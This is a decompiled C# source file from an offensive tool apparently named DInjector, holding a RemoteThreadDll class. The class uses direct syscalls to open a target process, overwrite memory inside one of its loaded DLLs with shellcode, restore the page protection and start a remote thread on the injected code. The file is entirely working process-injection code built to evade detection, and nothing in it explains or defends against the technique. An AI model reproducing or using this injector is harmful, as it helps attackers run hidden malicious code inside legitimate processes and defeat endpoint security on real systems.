using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using DInvoke.Data;
using DInvoke.DynamicInvoke;

namespace DInjector
{
	// Token: 0x0200000F RID: 15
	internal class RemoteThreadDll
	{
		// Token: 0x06000031 RID: 49 RVA: 0x00003FA0 File Offset: 0x000021A0
		public static void Execute(byte[] shellcodeBytes, int processID, string moduleName)
		{
			RemoteThreadDll.NtOpenProcess ntOpenProcess = (RemoteThreadDll.NtOpenProcess)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtOpenProcess"), typeof(RemoteThreadDll.NtOpenProcess));
			IntPtr zero = IntPtr.Zero;
			RemoteThreadDll.OBJECT_ATTRIBUTES object_ATTRIBUTES = default(RemoteThreadDll.OBJECT_ATTRIBUTES);
			RemoteThreadDll.CLIENT_ID client_ID = new RemoteThreadDll.CLIENT_ID
			{
				UniqueProcess = (IntPtr)processID
			};
			DInvoke.Data.Native.NTSTATUS ntstatus = ntOpenProcess(ref zero, Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS, ref object_ATTRIBUTES, ref client_ID);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(RemoteThreadDll) [+] NtOpenProcess");
			}
			else
			{
				Console.WriteLine(string.Format("(RemoteThreadDll) [-] NtOpenProcess: {0}", ntstatus));
			}
			foreach (object obj in Process.GetProcessById(processID).Modules)
			{
				ProcessModule processModule = (ProcessModule)obj;
				if (processModule.FileName.ToLower().Contains(moduleName))
				{
					IntPtr intPtr = processModule.BaseAddress + 4096;
					IntPtr intPtr2 = (IntPtr)shellcodeBytes.Length;
					uint newProtect = 0U;
					RemoteThreadDll.NtProtectVirtualMemory ntProtectVirtualMemory = (RemoteThreadDll.NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtProtectVirtualMemory"), typeof(RemoteThreadDll.NtProtectVirtualMemory));
					ntstatus = ntProtectVirtualMemory(zero, ref intPtr, ref intPtr2, 4U, out newProtect);
					if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
					{
						Console.WriteLine("(RemoteThreadDll) [+] NtProtectVirtualMemory, PAGE_READWRITE");
					}
					else
					{
						Console.WriteLine(string.Format("(RemoteThreadDll) [-] NtProtectVirtualMemory, PAGE_READWRITE: {0}", ntstatus));
					}
					RemoteThreadDll.NtWriteVirtualMemory ntWriteVirtualMemory = (RemoteThreadDll.NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtWriteVirtualMemory"), typeof(RemoteThreadDll.NtWriteVirtualMemory));
					IntPtr intPtr3 = Marshal.AllocHGlobal(shellcodeBytes.Length);
					Marshal.Copy(shellcodeBytes, 0, intPtr3, shellcodeBytes.Length);
					uint num = 0U;
					ntstatus = ntWriteVirtualMemory(zero, intPtr, intPtr3, (uint)shellcodeBytes.Length, ref num);
					if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
					{
						Console.WriteLine("(RemoteThreadDll) [+] NtWriteVirtualMemory");
					}
					else
					{
						Console.WriteLine(string.Format("(RemoteThreadDll) [-] NtWriteVirtualMemory: {0}", ntstatus));
					}
					Marshal.FreeHGlobal(intPtr3);
					uint num2;
					ntstatus = ntProtectVirtualMemory(zero, ref intPtr, ref intPtr2, newProtect, out num2);
					if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
					{
						Console.WriteLine("(RemoteThreadDll) [+] NtProtectVirtualMemory, oldProtect");
					}
					else
					{
						Console.WriteLine(string.Format("(RemoteThreadDll) [-] NtProtectVirtualMemory, oldProtect: {0}", ntstatus));
					}
					RemoteThreadDll.NtCreateThreadEx ntCreateThreadEx = (RemoteThreadDll.NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtCreateThreadEx"), typeof(RemoteThreadDll.NtCreateThreadEx));
					IntPtr zero2 = IntPtr.Zero;
					ntstatus = ntCreateThreadEx(out zero2, Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED, IntPtr.Zero, zero, intPtr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
					if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
					{
						Console.WriteLine("(RemoteThreadDll) [+] NtCreateThreadEx");
						break;
					}
					Console.WriteLine(string.Format("(RemoteThreadDll) [-] NtCreateThreadEx: {0}", ntstatus));
					break;
				}
			}
		}

		// Token: 0x02000048 RID: 72
		// (Invoke) Token: 0x060000B2 RID: 178
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtOpenProcess(ref IntPtr ProcessHandle, Win32.Kernel32.ProcessAccessFlags DesiredAccess, ref RemoteThreadDll.OBJECT_ATTRIBUTES ObjectAttributes, ref RemoteThreadDll.CLIENT_ID ClientId);

		// Token: 0x02000049 RID: 73
		// (Invoke) Token: 0x060000B6 RID: 182
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer, uint BufferLength, ref uint BytesWritten);

		// Token: 0x0200004A RID: 74
		// (Invoke) Token: 0x060000BA RID: 186
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);

		// Token: 0x0200004B RID: 75
		// (Invoke) Token: 0x060000BE RID: 190
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtCreateThreadEx(out IntPtr threadHandle, Win32.WinNT.ACCESS_MASK desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, int stackZeroBits, int sizeOfStack, int maximumStackSize, IntPtr attributeList);

		// Token: 0x0200004C RID: 76
		private struct OBJECT_ATTRIBUTES
		{
			// Token: 0x04000275 RID: 629
			public int Length;

			// Token: 0x04000276 RID: 630
			public IntPtr RootDirectory;

			// Token: 0x04000277 RID: 631
			public IntPtr ObjectName;

			// Token: 0x04000278 RID: 632
			public uint Attributes;

			// Token: 0x04000279 RID: 633
			public IntPtr SecurityDescriptor;

			// Token: 0x0400027A RID: 634
			public IntPtr SecurityQualityOfService;
		}

		// Token: 0x0200004D RID: 77
		private struct CLIENT_ID
		{
			// Token: 0x0400027B RID: 635
			public IntPtr UniqueProcess;

			// Token: 0x0400027C RID: 636
			public IntPtr UniqueThread;
		}
	}
}
